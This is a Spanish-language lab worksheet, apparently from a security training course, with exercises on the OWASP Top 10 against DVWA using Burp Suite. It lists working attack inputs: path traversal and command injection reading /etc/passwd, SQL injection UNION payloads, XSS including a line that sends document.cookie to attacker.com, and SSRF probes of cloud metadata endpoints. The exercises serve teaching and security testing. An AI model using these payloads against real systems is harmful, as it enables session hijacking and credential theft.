# 🧪 Laboratorio: OWASP Top 10 - Prácticas Completas

## Objetivo
Practicar la identificación y explotación de las 10 vulnerabilidades más críticas del OWASP Top 10 en un entorno controlado.

## Requisitos Previos
- BurpSuite configurado
- Navegador con proxy configurado
- Acceso a DVWA o entorno similar

---

## Ejercicio 1: A01 - Broken Access Control 🔓

### Objetivo
Explorar vulnerabilidades de control de acceso en DVWA.

### Pasos

1. **Iniciar DVWA** y configurar security level a "low"

2. **Directory Traversal**
   ```
   Burp Proxy → Intercept ON
   GET /vulnerabilities/fi/?page=../../../../etc/passwd
   ```

3. **IDOR (Insecure Direct Object Reference)**
   ```
   Cambiar el ID de usuario en la URL:
   http://dvwa/vulnerabilities/authbypass/?id=1
   http://dvwa/vulnerabilities/authbypass/?id=2
   ```

4. **Verificar con Burp Repeater**
   - Enviar request a Repeater
   - Modificar el ID
   - Observar diferentes datos

### Entregable
Captura de pantalla de cada vulnerabilidad encontrada.

---

## Ejercicio 2: A02 - Cryptographic Failures 🔐

### Objetivo
Identificar datos sensibles expuestos y debilidades criptográficas.

### Pasos

1. **Traffic Interception**
   ```
   Buscar en HTTP History:
   - Credenciales en URL (GET parameters)
   - Tokens JWT en Authorization headers
   - Datos sensibles en cookies
   ```

2. **Análisis de cookies**
   ```
   Burp → Decoder
   - Decodificar cookies (Base64)
   - Identificar información expuesta
   ```

3. **JWT Analysis**
   ```
   Instalar JWT Editor en Burp
   - Analizar algoritmo (none, HS256)
   - Modificar payload
   - Firmar con clave conocida
   ```

---

## Ejercicio 3: A03 - Injection 💉

### Objetivo
Explotar inyecciones SQL, XSS y Command Injection.

### 3.1 SQL Injection (DVWA)

```sql
' OR '1'='1
' UNION SELECT NULL, version()--
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

### 3.2 XSS Reflejado

```javascript
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 3.3 XSS Almacenado

```javascript
<script>fetch('https://attacker.com?c='+document.cookie)</script>
```

### 3.4 Command Injection

```bash
; ls -la
| cat /etc/passwd
$(whoami)
`whoami`
```

---

## Ejercicio 4: A04 - Insecure Design 🎨

### Objetivo
Identificar falhas de diseño de seguridad.

### Pasos

1. **Rate Limiting**
   ```
   Enviar múltiples requests de login rápidamente
   Observar si hay límite
   ```

2. **Bypass de autenticación**
   ```
   Forzar browse a páginas protegidas después de logout
   Manipular cookies de sesión
   ```

3. **Lógica de negocio**
   ```
   - Carrito de compras: precios negativos
   - Descuentos: aplicar múltiples veces
   - Transferencias: valores extremos
   ```

---

## Ejercicio 5: A05 - Security Misconfiguration ⚙️

### Pasos

1. **Headers de seguridad**
   ```
   Burp → HTTP History → Analyze responses
   Verificar ausencia de:
   - X-Frame-Options
   - X-Content-Type-Options
   - Strict-Transport-Security
   - X-XSS-Protection
   ```

2. **Information Disclosure**
   ```
   Buscar en respuestas:
   - Stack traces
   - Versiones de software
   - Rutas de archivo
   - Comentarios revealing
   ```

3. **Debug Mode**
   ```
   Buscar endpoints como:
   - /debug
   - /admin/debug
   - /env
   - /info
   ```

---

## Ejercicio 6: A06 - Vulnerable Components 🧩

### Pasos

1. **Identificar versiones**
   ```
   - Headers de respuesta (Server, X-Powered-By)
   - HTML source (versiones de libraries)
   - Errores (stack traces con versiones)
   ```

2. **Vulnerability Research**
   ```
   Buscar en:
   - https://nvd.nist.gov/
   - https://cve.mitre.org/
   - https://exploit-db.com/
   ```

3. **Actualizaciones**
   ```
   # Verificar con npm
   npm audit
   
   # Verificar con pip
   pip-audit
   ```

---

## Ejercicio 7: A07 - Auth Failures 🔑

### Pasos

1. **Weak Password Policy**
   ```
   Crear cuenta con:
   - Contraseña corta
   - Solo números
   - Sin caracteres especiales
   ```

2. **Session Management**
   ```
   - Analizar cookies de sesión
   - Duración de tokens
   - Invalidación después de logout
   ```

3. **JWT Weakness**
   ```
   - Algoritmo "none"
   - Clave weak para HS256
   - Claims importantes sin verificar
   ```

---

## Ejercicio 8: A08 - Software Integrity Failures 🔗

### Pasos

1. **Subresource Integrity**
   ```
   Verificar que scripts externos tienen integrity attribute
   <script src="https://cdn.jsdelivr.net/npm/vue"
           integrity="sha384-..."
           crossorigin="anonymous">
   ```

2. **Auto-update**
   ```
   - Verificar signatures de actualizaciones
   - HTTPS para downloads
   ```

---

## Ejercicio 9: A09 - Logging Failures 📝

### Pasos

1. **Identificar logging**
   ```
   Buscar en código:
   - print()
   - console.log()
   - logging.info()
   ```

2. **Verificar qué se loggea**
   ```
   - Credenciales
   - Tokens
   - Datos sensibles
   - IPs de usuarios
   ```

3. **Log Injection**
   ```
   Injectar caracteres en input que aparezca en logs:
   \n<script>alert(1)</script>
   ```

---

## Ejercicio 10: A10 - SSRF 🌐

### Objetivos
Explotar Server-Side Request Forgery.

### Pasos

1. **Identificar funcionalidad SSRF**
   ```
   Buscar:
   - URL parameters que cargan recursos
   - Preview de URLs
   - Export/Import de datos
   ```

2. **Pruebas básicas**
   ```
   ?url=http://localhost
   ?url=http://127.0.0.1
   ?url=file:///etc/passwd
   ```

3. **Cloud Metadata**
   ```
   # AWS
   ?url=http://169.254.169.254/latest/meta-data/
   
   # GCP
   ?url=http://metadata.google.internal/computeMetadata/v1/
   
   # Azure
   ?url=http://169.254.169.254/metadata/instance
   ```

---

## Herramientas de Automatización

### Nmap NSE Scripts
```bash
nmap --script=http-title,http-headers,http-robots.txt -p80 target.com
```

### BurpSuite Scanner
```
1. Target → Add to scope
2. Audit → New audit
3. Select OWASP Top 10
4. Run
```

### OWASP ZAP
```bash
# Iniciar ZAP (asegúrate de que Docker esté corriendo)
docker run -d -p 8080:8080 -p 9090:9090 --name zap owasp/zap2docker-stable

# Verificar contenedor
docker ps | grep zap

# Acceder a la interfaz web
# http://localhost:9090
```

---

## Entregable Final

| Vulnerabilidad | Encontrada | Severidad | Descripción |
|----------------|------------|-----------|-------------|
| A01: Broken Access Control | ☐ | | |
| A02: Cryptographic Failures | ☐ | | |
| A03: Injection | ☐ | | |
| A04: Insecure Design | ☐ | | |
| A05: Security Misconfig | ☐ | | |
| A06: Vulnerable Components | ☐ | | |
| A07: Auth Failures | ☐ | | |
| A08: Integrity Failures | ☐ | | |
| A09: Logging Failures | ☐ | | |
| A10: SSRF | ☐ | | |

**Total de vulnerabilidades:** ____

**Severidad crítica:** ____
**Severidad alta:** ____
**Severidad media:** ____